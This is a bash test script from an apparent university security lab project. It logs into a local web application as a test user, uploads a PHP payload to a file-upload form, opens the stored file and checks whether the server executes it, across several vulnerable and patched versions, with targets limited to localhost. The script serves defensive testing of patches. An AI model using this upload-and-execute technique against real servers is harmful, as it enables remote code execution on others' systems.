#!/usr/bin/env bash
# CS4239 G413 — repeatable RCE test (Member B).
#
# Logs in as Arcie, uploads the SAME payload (exploits/rce/<ver>.php) to the
# RCE upload form, opens the stored file, and checks for server-side execution.
# The payload is never changed to fit a defence; only the target version changes.
#
# Usage:   tests/rce_test.sh [version] [base_url]
#   version   v1 (default) | v2 | v3 | patched -- application version to test
#   base_url  default http://127.0.0.1:8080  (localhost only)
#
# Exit 0 = RCE occurred (vulnerable), 1 = no execution (blocked/placeholder),
#        2 = test harness error (login/upload failed).
set -u
REPO="$(cd "$(dirname "$0")/.." && pwd)"
VER="${1:-v1}"
BASE="${2:-http://127.0.0.1:8080}"
if [ "$VER" = "patched" ]; then
  PAYLOAD="$REPO/exploits/rce/patched.php"
else
  PAYLOAD="$REPO/exploits/rce/$VER.php"
fi

case "$BASE" in http://127.0.0.1*|http://localhost*) ;; *) echo "localhost only"; exit 2;; esac
[ -f "$PAYLOAD" ] || { echo "Payload not found: $PAYLOAD"; exit 2; }

CJ="$(mktemp)"; trap 'rm -f "$CJ"' EXIT

echo "== RCE test: version=$VER base=$BASE =="
echo "-- Attacker logs in as Arcie"
curl -s -L -c "$CJ" -b "$CJ" -d "username=arcie&password=password123" \
     "$BASE/login.php" | grep -q "Signed in as <strong>arcie" \
  || { echo "FAIL: Arcie login failed"; exit 2; }

if [ "$VER" = "patched" ]; then
  UPLOAD_URL="$BASE/scenarios/patched/rce/upload.php"
  LIST_URL="$BASE/scenarios/patched/rce/"
else
  UPLOAD_URL="$BASE/scenarios/rce/$VER/upload.php"
  LIST_URL="$BASE/scenarios/rce/$VER/"
fi
echo "-- Uploading $PAYLOAD to $UPLOAD_URL"
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$CJ" \
       -F "userfile=@$PAYLOAD;type=application/x-php" \
       "$UPLOAD_URL")
if [ "$code" != "200" ] && [ "$code" != "302" ]; then
  echo "Upload returned HTTP $code (version likely not implemented / rejected)."
  echo "RESULT: no RCE (upload not accepted for $VER)."; exit 1
fi

echo "-- Reading file list, finding newest stored upload"
LINK=$(curl -s -b "$CJ" "$LIST_URL" \
       | grep -oE 'href="[^"]*(uploads/[^"]+|download\.php\?id=[0-9]+)"' \
       | head -1 | sed -E 's/^href="|"$//g')
[ -n "$LINK" ] || { echo "FAIL: could not find uploaded file link"; exit 2; }
echo "   stored at: $LINK"

echo "-- Opening the uploaded file (this is what triggers execution if vulnerable)"
OUT=$(curl -s -b "$CJ" "$BASE$LINK")
echo "---- server response ----"
echo "$OUT"
echo "-------------------------"

if echo "$OUT" | grep -q "^LAB_RCE_MARKER_EXECUTED$"; then
  WHO=$(echo "$OUT" | grep -i "Result:" | head -1)
  echo "RESULT: *** RCE CONFIRMED *** PHP executed on the server. $WHO"
  exit 0
else
  echo "RESULT: no RCE — the file was served as data, not executed."
  exit 1
fi
